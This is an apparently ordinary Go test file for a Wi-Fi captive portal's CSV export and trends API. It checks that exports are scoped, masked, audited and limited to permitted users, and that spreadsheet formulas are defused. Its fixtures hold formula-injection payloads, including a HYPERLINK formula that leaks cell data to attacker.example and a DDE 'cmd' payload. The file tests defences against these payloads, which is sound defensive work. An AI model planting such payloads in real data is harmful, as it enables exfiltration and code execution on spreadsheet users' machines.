package api_test

import (
	"context"
	"encoding/csv"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
	"time"

	"github.com/kiennt048/foyer/internal/api"
	"github.com/kiennt048/foyer/internal/api/gen"
	"github.com/kiennt048/foyer/internal/api/memory"
	"github.com/kiennt048/foyer/internal/portal"
)

// The `reports` operations, driven over HTTP.
//
// Every test here drives the wire: a CSV export is a document somebody opens in a
// spreadsheet, and the properties that matter — the header, the neutralised cell,
// the masked code, the status on a failure — are properties of the bytes, not of a
// function.

// hostileUsername is what a guest can type into the portal's account form, and it
// reaches `radacct.username` through the NAS verbatim.
const hostileUsername = `=HYPERLINK("https://attacker.example/?d="&A2,"Click")`

const voucherCode = "ABCDEFGHJKMN"

// reportRig is the ordinary rig plus the rows these operations read.
func reportRig(t *testing.T) *rig {
	t.Helper()
	r := newRig(t)
	w := r.store.World()
	voucherKind := gen.SessionIdentityKindVoucher
	accountKind := gen.SessionIdentityKindAccount
	w.Sessions = append(w.Sessions,
		gen.Session{
			Id: "sess-hostile", SiteId: testSite, NasId: "nas-1", State: gen.SessionStateEnded,
			CallingStationId: "=cmd|' /C calc'!A0", IdentityKind: &accountKind,
			Username: ptrTo(hostileUsername), StartedAt: at(-2),
			EndedAt: ptrTo(at(-2).Add(time.Hour)), Freshness: gen.Freshness{State: gen.FreshnessStateSampled},
			InputOctets: ptrTo(100), OutputOctets: ptrTo(200), InputOctetsTotal: ptrTo(100), OutputOctetsTotal: ptrTo(200),
			SessionSeconds: ptrTo(-12),
		},
		gen.Session{
			Id: "sess-voucher", SiteId: testSite, NasId: "nas-1", State: gen.SessionStateOnline,
			CallingStationId: "da:a1:19:00:00:01", IdentityKind: &voucherKind,
			Username: ptrTo(voucherCode), StartedAt: at(-1),
			LastUpdateAt: ptrTo(at(0).Add(-2 * time.Minute)),
			Freshness:    gen.Freshness{State: gen.FreshnessStateSampled, IntervalSeconds: ptrTo(300)},
			InputOctets:  ptrTo(1), OutputOctets: ptrTo(1),
			InputOctetsTotal: ptrTo(4294967297), OutputOctetsTotal: ptrTo(1), CountersWrapped: true,
		},
		// Outside every range the tests ask for, so a range that leaked would show.
		gen.Session{
			Id: "sess-old", SiteId: testSite, NasId: "nas-1", State: gen.SessionStateEnded,
			CallingStationId: "aa:bb:cc:00:00:09", StartedAt: at(-200),
			Freshness: gen.Freshness{State: gen.FreshnessStateAbsent},
		},
		// Another venue's session in range: a dropped site scope would export it.
		gen.Session{
			Id: "sess-elsewhere", SiteId: "site-two", NasId: "nas-x", State: gen.SessionStateEnded,
			CallingStationId: "aa:bb:cc:00:00:10", StartedAt: at(-1),
			Freshness: gen.Freshness{State: gen.FreshnessStateAbsent},
		},
	)
	w.Batches = append(w.Batches, gen.VoucherBatch{Id: "batch-1", SiteId: testSite, Label: "Counter", Count: 2})
	w.Vouchers = append(w.Vouchers,
		gen.Voucher{Id: "v-used", BatchId: "batch-1", Code: voucherCode, State: gen.VoucherStateInUse,
			CreatedAt: ptrTo(at(-40)), FirstUsedAt: ptrTo(at(-1))},
		gen.Voucher{Id: "v-unused", BatchId: "batch-1", Code: "MNPQRSTUVWXY", State: gen.VoucherStateUnused,
			CreatedAt: ptrTo(at(-3))},
		gen.Voucher{Id: "v-ancient", BatchId: "batch-1", Code: "ZZZZZZZZZZZZ", State: gen.VoucherStateExpired,
			CreatedAt: ptrTo(at(-300))},
	)
	r.store.PortalStore = portal.NewMemoryStore()
	for _, g := range []portal.Grant{
		{ID: "grant-1", SiteID: testSite, ClientMAC: "da:a1:19:00:00:01", Method: portal.MethodVoucher,
			VoucherID: "v-used", Username: voucherCode, GrantedAt: at(-1)},
		{ID: "grant-2", SiteID: testSite, ClientMAC: "3c:22:fb:00:00:02", Method: portal.MethodAccount,
			Username: "@SUM(A1)", GrantedAt: at(-1).Add(time.Hour)},
		{ID: "grant-3", SiteID: testSite, ClientMAC: "3c:22:fb:00:00:03", Method: portal.MethodClickThrough,
			GrantedAt: at(-2)},
	} {
		if err := r.store.PortalStore.CreateGrant(context.Background(), g); err != nil {
			t.Fatal(err)
		}
	}
	return r
}

func ptrTo[T any](v T) *T { return &v }

func rangeQuery(from, to time.Time) string {
	q := url.Values{}
	q.Set("siteId", testSite)
	q.Set("from", from.Format(time.RFC3339))
	q.Set("to", to.Format(time.RFC3339))
	return q.Encode()
}

// readCSV parses a document and returns its records, the byte-order mark stripped.
func readCSV(t *testing.T, body string) [][]string {
	t.Helper()
	if !strings.HasPrefix(body, "\uFEFF") {
		t.Fatalf("the document does not open with a byte-order mark — Excel would read it in the "+
			"system code page and a Vietnamese venue name would open as mojibake\n%q", body)
	}
	recs, err := csv.NewReader(strings.NewReader(strings.TrimPrefix(body, "\uFEFF"))).ReadAll()
	if err != nil {
		t.Fatalf("not CSV: %v\n%s", err, body)
	}
	return recs
}

// declaredColumns reads `x-csv-columns` independently of the handler, so a header
// that matched only because both came from one wrong place would still be caught.
func declaredColumns(t *testing.T, path string) []string {
	t.Helper()
	spec, err := gen.GetSwagger()
	if err != nil {
		t.Fatal(err)
	}
	raw, _ := spec.Paths.Find(path).Get.Extensions["x-csv-columns"].([]any)
	out := make([]string, 0, len(raw))
	for _, c := range raw {
		out = append(out, c.(string))
	}
	if len(out) == 0 {
		t.Fatalf("%s declares no x-csv-columns", path)
	}
	return out
}

func byColumn(header, row []string) map[string]string {
	m := map[string]string{}
	for i, h := range header {
		m[h] = row[i]
	}
	return m
}

// TestExportSessionsIsTheContractsDocument drives the whole promise of
// `ExportCsv` on the session export: status, headers, the byte-order mark, the
// declared header, the range, the site scope, the order, a neutralised hostile
// value, a masked voucher code, and a negative figure left sortable.
func TestExportSessionsIsTheContractsDocument(t *testing.T) {
	r := reportRig(t)
	r.signIn(adminUser)

	resp := r.do(http.MethodGet, "/exports/sessions?"+rangeQuery(at(-7), at(1)), nil)
	body := readAll(t, resp)
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("exportSessions got %d\n%s", resp.StatusCode, body)
	}
	if ct := resp.Header.Get("Content-Type"); !strings.HasPrefix(ct, "text/csv") {
		t.Errorf("Content-Type = %q, want text/csv", ct)
	}
	cd := resp.Header.Get("Content-Disposition")
	if cd != `attachment; filename="foyer-sessions-site-one-20260819-20260827.csv"` {
		t.Errorf("Content-Disposition = %q", cd)
	}
	if resp.Header.Get("Cache-Control") != "no-store" {
		t.Errorf("Cache-Control = %q, want no-store — this is personal data", resp.Header.Get("Cache-Control"))
	}

	recs := readCSV(t, body)
	want := declaredColumns(t, "/exports/sessions")
	if strings.Join(recs[0], ",") != strings.Join(want, ",") {
		t.Fatalf("header = %v\nwant the contract's x-csv-columns = %v", recs[0], want)
	}
	if len(recs) != 3 {
		t.Fatalf("got %d rows, want the two in-range sessions of this site — the range or the "+
			"site scope leaked\n%s", len(recs)-1, body)
	}
	first, second := byColumn(recs[0], recs[1]), byColumn(recs[0], recs[2])
	if first["sessionId"] != "sess-hostile" || second["sessionId"] != "sess-voucher" {
		t.Errorf("order = %s, %s; want oldest first", first["sessionId"], second["sessionId"])
	}
	if first["username"] != "'"+hostileUsername {
		t.Errorf("username = %q\nwant the formula defused with a leading quote — a spreadsheet would "+
			"otherwise evaluate a value a stranger typed into the portal", first["username"])
	}
	if first["callingStationId"] != "'=cmd|' /C calc'!A0" {
		t.Errorf("callingStationId = %q, want the DDE payload defused", first["callingStationId"])
	}
	if first["sessionSeconds"] != "-12" {
		t.Errorf("sessionSeconds = %q, want -12 left as a number a spreadsheet can sort", first["sessionSeconds"])
	}
	if strings.Contains(body, voucherCode) {
		t.Errorf("the export carries a voucher code in full — an in-use code still opens the network\n%s", body)
	}
	if second["username"] != "…JKMN" {
		t.Errorf("voucher session username = %q, want the last four characters only", second["username"])
	}
	if second["countersWrapped"] != "true" || second["inputOctetsTotal"] != "4294967297" {
		t.Errorf("wrapped counter exported as %q / %q", second["countersWrapped"], second["inputOctetsTotal"])
	}
	if second["freshnessState"] != "sampled" || second["freshnessIntervalSeconds"] != "300" {
		t.Errorf("the figures left without their freshness: %q / %q",
			second["freshnessState"], second["freshnessIntervalSeconds"])
	}
	if first["endedAt"] == "" || second["endedAt"] != "" {
		t.Errorf("endedAt = %q / %q — an absent value must be an empty cell", first["endedAt"], second["endedAt"])
	}
}

func TestExportVouchersCarriesAHintAndNeverACode(t *testing.T) {
	r := reportRig(t)
	r.signIn(adminUser)

	resp := r.do(http.MethodGet, "/exports/vouchers?"+rangeQuery(at(-7), at(1)), nil)
	body := readAll(t, resp)
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("exportVouchers got %d\n%s", resp.StatusCode, body)
	}
	recs := readCSV(t, body)
	if strings.Join(recs[0], ",") != strings.Join(declaredColumns(t, "/exports/vouchers"), ",") {
		t.Fatalf("header = %v", recs[0])
	}
	// `v-used` was created long ago and first used in range; `v-unused` was created
	// in range; `v-ancient` is neither.
	ids := []string{}
	for _, rec := range recs[1:] {
		row := byColumn(recs[0], rec)
		ids = append(ids, row["voucherId"])
	}
	if strings.Join(ids, ",") != "v-used,v-unused" {
		t.Errorf("rows = %v, want v-used (first used in range) then v-unused (created in range)", ids)
	}
	for _, code := range []string{voucherCode, "MNPQRSTUVWXY"} {
		if strings.Contains(body, code) {
			t.Errorf("the export carries the code %s in full\n%s", code, body)
		}
	}
	if row := byColumn(recs[0], recs[1]); row["codeHint"] != "…JKMN" {
		t.Errorf("codeHint = %q", row["codeHint"])
	}
}

func TestExportGuestsIsOneRowPerGrant(t *testing.T) {
	r := reportRig(t)
	r.signIn(adminUser)

	resp := r.do(http.MethodGet, "/exports/guests?"+rangeQuery(at(-7), at(1)), nil)
	body := readAll(t, resp)
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("exportGuests got %d\n%s", resp.StatusCode, body)
	}
	recs := readCSV(t, body)
	if strings.Join(recs[0], ",") != strings.Join(declaredColumns(t, "/exports/guests"), ",") {
		t.Fatalf("header = %v", recs[0])
	}
	if len(recs) != 4 {
		t.Fatalf("got %d rows, want 3 grants\n%s", len(recs)-1, body)
	}
	rows := map[string]map[string]string{}
	for _, rec := range recs[1:] {
		row := byColumn(recs[0], rec)
		rows[row["grantId"]] = row
	}
	if byColumn(recs[0], recs[1])["grantId"] != "grant-3" {
		t.Errorf("first row = %s, want grant-3, the oldest", byColumn(recs[0], recs[1])["grantId"])
	}
	if rows["grant-1"]["accountUsername"] != "" || strings.Contains(body, voucherCode) {
		t.Errorf("a voucher grant exported its code as a username\n%s", body)
	}
	if rows["grant-2"]["accountUsername"] != "'@SUM(A1)" {
		t.Errorf("accountUsername = %q, want the formula defused", rows["grant-2"]["accountUsername"])
	}
	if rows["grant-1"]["macIsRandomised"] != "true" || rows["grant-2"]["macIsRandomised"] != "false" {
		t.Errorf("macIsRandomised = %q / %q", rows["grant-1"]["macIsRandomised"], rows["grant-2"]["macIsRandomised"])
	}
}

// TestStaffMayNotExport is the permission's reason for existing: staff read every
// session on screen, and do not take the table home.
func TestStaffMayNotExport(t *testing.T) {
	r := reportRig(t)
	r.signIn(staffUser)
	for _, path := range []string{"/exports/sessions", "/exports/vouchers", "/exports/guests"} {
		resp := r.do(http.MethodGet, path+"?"+rangeQuery(at(-7), at(1)), nil)
		body := readAll(t, resp)
		resp.Body.Close()
		if resp.StatusCode != http.StatusForbidden || !strings.Contains(body, `"required":"reports:export"`) {
			t.Errorf("%s as staff: %d %s\nwant 403 naming reports:export", path, resp.StatusCode, body)
		}
	}
	// Trends name nobody, so staff see the chart.
	resp := r.do(http.MethodGet, "/trends?"+rangeQuery(at(-7), at(1)), nil)
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Errorf("getTrends as staff: %d, want 200", resp.StatusCode)
	}
}

func TestAnExportIsAlwaysBounded(t *testing.T) {
	r := reportRig(t)
	r.signIn(adminUser)

	cases := []struct {
		name, query, fault string
		maxDays            float64
	}{
		{"no range at all", "siteId=" + testSite, "", 0},
		{"inverted", rangeQuery(at(0), at(-1)), "range-inverted", 0},
		{"empty", rangeQuery(at(0), at(0)), "range-inverted", 0},
		{"longer than a quarter", rangeQuery(at(-93), at(0)), "range-too-long", 92},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			resp := r.do(http.MethodGet, "/exports/sessions?"+tc.query, nil)
			body := readAll(t, resp)
			resp.Body.Close()
			if resp.StatusCode != http.StatusUnprocessableEntity {
				t.Fatalf("got %d, want 422\n%s", resp.StatusCode, body)
			}
			if tc.fault == "" {
				return
			}
			var p struct {
				Params struct {
					Fields      map[string]string         `json:"fields"`
					FieldParams map[string]map[string]any `json:"fieldParams"`
				} `json:"params"`
			}
			if err := json.Unmarshal([]byte(body), &p); err != nil {
				t.Fatal(err)
			}
			if p.Params.Fields["to"] != tc.fault {
				t.Errorf("fault = %v, want to: %s", p.Params.Fields, tc.fault)
			}
			if tc.maxDays > 0 && p.Params.FieldParams["to"]["maxDays"] != tc.maxDays {
				t.Errorf("fieldParams = %v, want to.maxDays = %v (x-fault-params)", p.Params.FieldParams, tc.maxDays)
			}
		})
	}
	// Exactly the bound is answered.
	resp := r.do(http.MethodGet, "/exports/sessions?"+rangeQuery(at(-92), at(0)), nil)
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Errorf("a range of exactly 92 days: %d, want 200", resp.StatusCode)
	}
}

// TestAnExportIsRecordedBeforeItIsSent: the entry exists, names the dataset and
// the range, and belongs to the venue whose rows left.
func TestAnExportIsRecordedBeforeItIsSent(t *testing.T) {
	r := reportRig(t)
	r.signIn(adminUser)
	resp := r.do(http.MethodGet, "/exports/guests?"+rangeQuery(at(-7), at(1)), nil)
	resp.Body.Close()

	entry := findAudit(auditEntries(t, r), gen.AuditKindDataExported)
	if entry == nil {
		t.Fatal("an export of personal data left no audit entry")
	}
	if entry.SiteId == nil || *entry.SiteId != testSite {
		t.Errorf("siteId = %v, want the venue whose rows left", entry.SiteId)
	}
	if entry.Subject == nil || entry.Subject.Kind != gen.AuditSubjectKindSite || entry.Subject.Id != testSite {
		t.Errorf("subject = %+v", entry.Subject)
	}
	if entry.Params == nil || (*entry.Params)["dataset"] != "guests" ||
		(*entry.Params)["from"] != at(-7).Format(time.RFC3339) {
		t.Errorf("params = %v, want dataset and range", entry.Params)
	}
	if entry.ActorUsername != adminUser {
		t.Errorf("actor = %q", entry.ActorUsername)
	}
}

// failingAudit refuses every append.
type failingAudit struct{ api.AuditLog }

func (failingAudit) Append(context.Context, gen.AuditEntry) error { return errors.New("disk full") }

// TestAnExportTheLogCannotSeeIsRefused is the fail-closed half: everywhere else a
// failed audit write is swallowed because the change already happened; here the
// data has not left yet, so the export is refused.
func TestAnExportTheLogCannotSeeIsRefused(t *testing.T) {
	store := reportRig(t).store
	ports := store.Ports()
	ports.Audit = failingAudit{ports.Audit}
	r := rigOver(t, store, ports)
	r.signIn(adminUser)

	resp := r.do(http.MethodGet, "/exports/sessions?"+rangeQuery(at(-7), at(1)), nil)
	body := readAll(t, resp)
	resp.Body.Close()
	if resp.StatusCode != http.StatusInternalServerError {
		t.Fatalf("got %d, want 500 — the export went out with no record of it\n%s", resp.StatusCode, body)
	}
	if strings.Contains(body, "sess-hostile") {
		t.Error("rows were sent although the audit entry was refused")
	}
}

// brokenReports fails the session scan after `after` rows.
type brokenReports struct {
	api.ReportReader
	after int
}

func (b brokenReports) SessionsStarted(ctx context.Context, siteID string, r api.Range, visit func(gen.Session) error) error {
	for i := 0; i < b.after; i++ {
		s := gen.Session{Id: "row", SiteId: siteID, StartedAt: r.From,
			CallingStationId: strings.Repeat("a", 64), Freshness: gen.Freshness{State: gen.FreshnessStateAbsent}}
		if err := visit(s); err != nil {
			return err
		}
	}
	return errors.New("connection reset by peer")
}

// TestAFailureIsNeverACompleteLookingFile covers both halves of `csvStream`:
// before the first byte the contract's problem document with its real status, and
// after it an aborted transfer — never a clean end with rows missing.
func TestAFailureIsNeverACompleteLookingFile(t *testing.T) {
	t.Run("before the first byte", func(t *testing.T) {
		store := reportRig(t).store
		ports := store.Ports()
		ports.Reports = brokenReports{ReportReader: ports.Reports, after: 0}
		r := rigOver(t, store, ports)
		r.signIn(adminUser)
		resp := r.do(http.MethodGet, "/exports/sessions?"+rangeQuery(at(-7), at(1)), nil)
		body := readAll(t, resp)
		resp.Body.Close()
		if resp.StatusCode != http.StatusInternalServerError || !strings.Contains(body, "/problems/internal") {
			t.Fatalf("got %d %q, want the internal problem document — a 200 with a header and no "+
				"rows reads as *nothing happened*", resp.StatusCode, body)
		}
	})
	t.Run("after the first byte", func(t *testing.T) {
		store := reportRig(t).store
		ports := store.Ports()
		// Enough rows to fill the writer's buffer, so bytes are on the wire before
		// the failure.
		ports.Reports = brokenReports{ReportReader: ports.Reports, after: 500}
		r := rigOver(t, store, ports)
		r.signIn(adminUser)
		resp := r.do(http.MethodGet, "/exports/sessions?"+rangeQuery(at(-7), at(1)), nil)
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			t.Fatalf("got %d before any failure", resp.StatusCode)
		}
		_, err := io.ReadAll(resp.Body)
		if err == nil {
			t.Fatal("the download ended cleanly although rows are missing — a spreadsheet cannot " +
				"tell a short file from a complete one")
		}
	})
}

func rigOver(t *testing.T, store *memory.Store, ports api.Ports) *rig {
	t.Helper()
	srv, err := api.New(api.Config{Ports: ports, Now: func() time.Time { return at(0) }})
	if err != nil {
		t.Fatalf("api.New: %v", err)
	}
	ts := httptest.NewServer(srv.Handler())
	t.Cleanup(ts.Close)
	return &rig{t: t, server: ts, store: store}
}

// TestTrendsCountWholeBucketsByTheContractsRules.
func TestTrendsCountWholeBucketsByTheContractsRules(t *testing.T) {
	r := reportRig(t)
	r.signIn(adminUser)

	// `at(0)` is 09:00 UTC; the store's clock is UTC, so a day is a UTC day here.
	resp := r.do(http.MethodGet, "/trends?"+rangeQuery(at(-3).Add(5*time.Hour), at(0)), nil)
	body := readAll(t, resp)
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("getTrends got %d\n%s", resp.StatusCode, body)
	}
	var tr gen.Trends
	if err := json.Unmarshal([]byte(body), &tr); err != nil {
		t.Fatal(err)
	}
	if tr.Granularity != gen.Day || len(tr.Buckets) != 4 {
		t.Fatalf("got %s × %d buckets, want day × 4 (from floored to midnight, to ceiled)", tr.Granularity, len(tr.Buckets))
	}
	day := func(i int) time.Time {
		y, m, d := at(-3).Date()
		return time.Date(y, m, d, 0, 0, 0, 0, time.UTC).AddDate(0, 0, i)
	}
	for i, b := range tr.Buckets {
		if !b.Start.Equal(day(i)) || !b.End.Equal(day(i+1)) {
			t.Errorf("bucket %d = [%s, %s), want [%s, %s)", i, b.Start, b.End, day(i), day(i+1))
		}
	}
	// Day -2: the hostile ended session (100+200 bytes, MAC unparseable) and the
	// click-through grant — one device, bytes final, so `live`.
	b2 := tr.Buckets[1]
	if b2.GuestDevices != 1 || b2.Bytes != 300 || b2.BytesLowerBound || b2.BytesFreshness.State != gen.FreshnessStateLive {
		t.Errorf("day -2 = %+v", b2)
	}
	// Day -1: the voucher session and its grant are one device (same MAC), the
	// account grant a second; the voucher was redeemed; the wrapped counter makes
	// the total a floor; the open session makes it a sample.
	b1 := tr.Buckets[2]
	if b1.GuestDevices != 2 {
		t.Errorf("day -1 guestDevices = %d, want 2 — a session and a grant for one MAC are one device", b1.GuestDevices)
	}
	if b1.VouchersRedeemed != 1 || b1.Bytes != 4294967298 || !b1.BytesLowerBound {
		t.Errorf("day -1 = %+v", b1)
	}
	if b1.BytesFreshness.State != gen.FreshnessStateSampled || b1.BytesFreshness.IntervalSeconds == nil ||
		*b1.BytesFreshness.IntervalSeconds != 300 {
		t.Errorf("day -1 freshness = %+v, want sampled at the 300-second floor", b1.BytesFreshness)
	}
	if b0 := tr.Buckets[0]; b0.GuestDevices != 0 || b0.Bytes != 0 || b0.BytesFreshness.State != gen.FreshnessStateLive {
		t.Errorf("an empty day = %+v, want zeros, live", b0)
	}
}

func TestWeeklyTrendsStartOnMonday(t *testing.T) {
	r := reportRig(t)
	r.signIn(adminUser)
	q := rangeQuery(at(-20), at(0)) + "&granularity=week"
	resp := r.do(http.MethodGet, "/trends?"+q, nil)
	body := readAll(t, resp)
	resp.Body.Close()
	var tr gen.Trends
	if err := json.Unmarshal([]byte(body), &tr); err != nil {
		t.Fatalf("%v\n%s", err, body)
	}
	for _, b := range tr.Buckets {
		if b.Start.Weekday() != time.Monday || b.End.Sub(b.Start) != 7*24*time.Hour {
			t.Errorf("bucket [%s, %s) is not a Monday-start week", b.Start, b.End)
		}
	}
	// A year and a day of weeks is refused, a year is not.
	resp = r.do(http.MethodGet, "/trends?"+rangeQuery(at(-400), at(0))+"&granularity=week", nil)
	resp.Body.Close()
	if resp.StatusCode != http.StatusUnprocessableEntity {
		t.Errorf("400 days of weeks: %d, want 422", resp.StatusCode)
	}
	resp = r.do(http.MethodGet, "/trends?"+rangeQuery(at(-93), at(0)), nil)
	resp.Body.Close()
	if resp.StatusCode != http.StatusUnprocessableEntity {
		t.Errorf("93 days of days: %d, want 422", resp.StatusCode)
	}
}
